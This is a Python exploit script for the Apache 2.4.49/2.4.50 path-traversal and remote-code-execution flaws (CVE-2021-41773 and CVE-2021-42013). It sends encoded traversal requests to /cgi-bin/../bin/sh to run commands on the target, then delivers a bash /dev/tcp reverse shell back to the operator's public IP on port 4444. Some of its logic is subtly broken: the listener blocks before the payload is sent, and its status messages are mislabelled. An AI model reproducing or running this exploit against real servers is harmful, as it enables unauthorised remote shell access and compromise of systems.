import requests
import socket
import sys

ARGS = len(sys.argv)

if ARGS != 2:
    print(f"[-] Usage: python3 {sys.argv[0]} <HOST:PORT>")
    sys.exit()
else:
    TARGET_HOST = sys.argv[1]

def CHECK_STATUS_CODE():
    STATUS_CODE = RESPONSE.status_code
    if STATUS_CODE == 403:
        print(f"[i] http://{TARGET_HOST}/cgi-bin/ returned 404 forbidden, we can't access it.")
    elif STATUS_CODE == 404:
        print(f"[i] http://{TARGET_HOST}/cgi-bin/ returned 404 not found.")
    elif STATUS_CODE == 200:
        print(f"[+] http://{TARGET_HOST}/ responded with 200 OK")
    else:
        print(f"[i] Server responded with {STATUS_CODE}")

def CHECK_APACHE_VERSION():
    SERVER_HEADER = RESPONSE.headers["Server"]
    if 'Apache/2.4.49' in SERVER_HEADER:
        print(f"[+] Apache version detected as 2.4.49")
    elif 'Apache/2.4.50' in SERVER_HEADER:
        print(f"[+] Apache version detected as 2.4.50")
    else:
        print(f"[-] {SERVER_HEADER} is not known to be vulnerable to CVE-2021-41773 or CVE-2021-42013")

def SETUP_LISTENING_SOCKET(PORT):
    print(f"[+] Starting socket...")
    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        SOCKET.bind(('', PORT))
    except socket.error as se:
        print(f"[-] Failed to bind : {str(se[0])} message {se[1]}")
        sys.exit()
    SOCKET.listen(5)
    print(f"[+] Started listener on port {PORT}")
    CONN, ADDRESS = SOCKET.accept()
    print(f"[+] Connection received from {ADDRESS[0]}")

def REVSHELL_PAYLOAD():
    IP = requests.get('https://api.ipify.org').text
    SHELL_DATA = f"echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/{IP}/4444 0>&1"
    requests.post(f"http://{TARGET_HOST}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh", verify=False, headers=HEADERS, data=SHELL_DATA)
    print(f"[+] Executed bash TCP reverse shell on target")

try: 
    HEADERS = {
        'Host': f'{TARGET_HOST}',
        'User-Agent': 'curl/7.85.0',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close'
    }
    DATA = 'echo Content-Type: text/plain; echo; id'
    RESPONSE = requests.post(f'http://{TARGET_HOST}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh', data=DATA, headers=HEADERS, verify=False)
    print(f"[+] {TARGET_HOST} is up and running")
except requests.exceptions.ConnectionError:
    print("[-] A connection error occured, target might be down")
    sys.exit()

def MAIN():
        try:
            CHECK_APACHE_VERSION()
            CHECK_STATUS_CODE()
            if 'uid=' in RESPONSE.text:
                print(f"[!] {TARGET_HOST} is vulnerable")
                SETUP_LISTENING_SOCKET(4444)
                REVSHELL_PAYLOAD()
            else:
                print(f"[-] {TARGET_HOST} doesn't seem to be vulnerable to LFI / Path Traversal or RCE")

        except KeyboardInterrupt:
            print("[-] Keyboard interrupt detected, exiting...")
        except Exception as e:
            print(f"[-] Exception occured\n-->{e}")
        
if __name__ == '__main__':
        MAIN()

